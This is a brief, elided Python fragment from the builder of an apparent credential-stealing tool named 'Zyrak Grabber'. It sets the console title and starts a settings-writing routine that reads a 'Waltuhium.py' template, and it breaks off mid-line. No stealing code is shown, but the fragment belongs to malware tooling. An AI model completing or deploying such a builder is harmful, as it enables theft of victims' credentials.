...
try:
    ...
    ctypes.windll.kernel32.SetConsoleTitleW(f"Zyrak Grabber | Builder | {os.getenv('computername')}")
except:
    pass

# Class for building the Zyrak
class Build:
    ...
    def WriteSettings(self) -> None:
        with open("Waltuhium.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = (
